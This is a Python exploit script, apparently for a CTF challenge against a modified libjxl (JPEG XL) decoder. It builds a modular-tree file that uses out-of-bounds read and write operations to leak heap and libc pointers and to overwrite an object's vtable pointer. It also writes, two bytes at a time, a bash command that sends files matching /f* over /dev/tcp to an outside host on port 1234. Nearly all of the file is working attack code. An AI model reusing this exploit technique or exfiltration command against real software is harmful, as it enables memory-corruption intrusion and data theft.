import struct
Zero = 0
Left = 1
Top = 2
Average0 = 3
Select = 4
Gradient = 5
Weighted = 6
TopRight = 7
TopLeft = 8
LeftLeft = 9
Average1 = 10
Average2 = 11
Average3 = 12
Average4 = 13
COPYTOP = 14
READ = 15
WRITE = 16
OOB = 17

u16 = lambda x: struct.unpack("H", x)[0]

class Node:
    def __init__(self, y, x, data):
        self.y = y
        self.x = x
        self.left = None
        self.right = None
        self.data = data

    def insert(self, y, x, data):
        if y > self.y:
            # y가 더 크면 왼쪽
            if self.left is None:
                self.left = Node(y, x, data)
            else:
                self.left.insert(y, x, data)
        elif y <= self.y:
            # y가 작으면 오른쪽
            if self.right is None:
                self.right = Node(y, x, data)
            else:
                self.right.insert(y, x, data)
        else:
            # y가 같으면 x 비교
            if x > self.x:
                if self.left is None:
                    self.left = Node(y, x, data)
                else:
                    self.left.insert(y, x, data)
            elif x < self.x:
                if self.right is None:
                    self.right = Node(y, x, data)
                else:
                    self.right.insert(y, x, data)
            else:
                # x와 y가 모두 같으면 예외
                assert False, f"Duplicate entry not allowed: ({y}, {x})"

    def __str__(self):
        return f"({self.y}, {self.x})"
    
class LibJXL:
    def __init__(self):
        self.y_cur = 0
        self.x_cur = 0
        self.root = Node(0, 0, '- Set 0')
        self.indent = 0
        self._gen_code = ''

    def _add_node(self, y, x, data):
        assert (x,y) != (0,0), "0, 0 cannot be not used"
        self.root.insert(y, x, data)

    def _add_code(self, code):
        return '   '*self.indent+ code + '\n'

    def _code_traversal_node(self, node):
        print(node, node.data)
        if not node.left and not node.right:
            return self._add_code(node.data)
        
        code = ''
        if node.left: 
            #print("LEFT ", end='')
            code += self._add_code(f'if y > {node.y}')
            self.indent += 1
            code += self._code_traversal_node(node.left) 
            self.indent -= 1

        if node.right:
            #print("RIGHT ", end='')
            code += self._add_code(f'if x > {node.x}')
            self.indent += 1
            code += self._code_traversal_node(node.right)
            self.indent -= 1
            
        code += self._add_code(node.data)

        return code

    def get_code(self):
        #traversal
        return self._code_traversal_node(self.root)
        #return self._gen_code

    def add_oob_write(self, oob_off, offset, new_oob_off=None):
        #self.y_cur += 1

        if new_oob_off == None:
            new_oob_off = oob_off

        self._add_node(1, self.x_cur, f'- Set {oob_off}')
        self.x_cur += 1
        self._add_node(1, self.x_cur, '- OP15 0') #OOB READ
        self.x_cur += 1
        self._add_node(0, self.x_cur-1, f'- Set 0') # 
        self._add_node(0, self.x_cur, f'- Set {offset}') # 
        self._add_node(1, self.x_cur, f'- OP17 0') # 17
        self.x_cur += 1
        self._add_node(0, self.x_cur, f'- Set {new_oob_off}') # 
        self._add_node(1, self.x_cur, '- OP16 0') # OVERWRITE
        self.x_cur += 1


''''
0x218 - class
*class = vtable
*class+8 = argument

'''
jxl = LibJXL()
#copy main_arena

jxl.add_oob_write(-((0x6ae0)//2), - 0xb3e0, 16)
jxl.add_oob_write(-((0x6ae0-2)//2), -0x1b, 17) # 1a +1
jxl.add_oob_write(-((0x6ae0-4)//2), 0, 18)
jxl.add_oob_write(-((0x6ae0-6)//2), 0, 19)

#copy heap
jxl.add_oob_write(-((0x1610)//2), 0, 4)
jxl.add_oob_write(-((0x1610-2)//2), 0, 5)
jxl.add_oob_write(-((0x1610-4)//2), 0, 23)
jxl.add_oob_write(-((0x1610-6)//2), 0, 28)



jxl.add_oob_write(-(0x35460)//2, 0x5460, -(0x35460)//2)
jxl.add_oob_write(-(0x35460-2)//2, 0x2, -(0x35460-2)//2)
#jxl.add_oob_write(6, 0, -(0x14f68-50)//2)



jxl.add_oob_write(0x210//2, 0xa1e0+0x30, 20)
jxl.add_oob_write(0x212//2, 0, 21)
jxl.add_oob_write(0x214//2, 0, 22)
jxl.add_oob_write(0x216//2, 0, 23)



jxl.add_oob_write(20, -0x10, 0x218//2)
jxl.add_oob_write(21, 0, (0x218+2)//2)





jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)



# 2
jxl.add_oob_write(0x270//2, u16(b'ba'), 24)
jxl.add_oob_write(0x270//2, u16(b'sh'), 25)
jxl.add_oob_write(0x270//2, u16(b' -'), 26)
jxl.add_oob_write(0x270//2, u16(b'c '), 27)
jxl.add_oob_write(0x270//2, u16(b'"c'), 28)
jxl.add_oob_write(0x270//2, u16(b'at'), 29)
jxl.add_oob_write(0x270//2, u16(b' /'), 30)
jxl.add_oob_write(0x270//2, u16(b'f*'), 31)
jxl.add_oob_write(0x270//2, u16(b' >'), 32)
jxl.add_oob_write(0x270//2, u16(b'/d'), 33)
jxl.add_oob_write(0x270//2, u16(b'ev'), 34)
jxl.add_oob_write(0x270//2, u16(b'/t'), 35)
jxl.add_oob_write(0x270//2, u16(b'cp'), 36)
jxl.add_oob_write(0x270//2, u16(b'/h'), 37)
jxl.add_oob_write(0x270//2, u16(b'ow'), 38)
jxl.add_oob_write(0x270//2, u16(b'da'), 39)
jxl.add_oob_write(0x270//2, u16(b'ys'), 40)
jxl.add_oob_write(0x270//2, u16(b'.k'), 41)
jxl.add_oob_write(0x270//2, u16(b'r/'), 42)
jxl.add_oob_write(0x270//2, u16(b'12'), 43)
jxl.add_oob_write(0x270//2, u16(b'34'), 44)
jxl.add_oob_write(0x270//2, u16(b'"\x00'), 45)
jxl.add_oob_write(0x270//2, u16(b'&1'), 46)
#jxl.add_oob_write(0x270//2, 0, 44)







jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)
jxl.add_oob_write(0x30//2, 0x897, 0x1320//2)

jxl.add_oob_write(0, 0, 0)


code = jxl.get_code()

open("./exploit.txt", "w").write(f'''
Rec2100 PQ
Bitdepth 8
Width 300
Height 300
                                 

{code}
''')
print(code)

##b*_ZN3jxl15PredictTreeNoWPEPSt6vectorIiSaIiEEmPKiliiRKNS_12MATreeLookupERKNS_7ChannelE+1309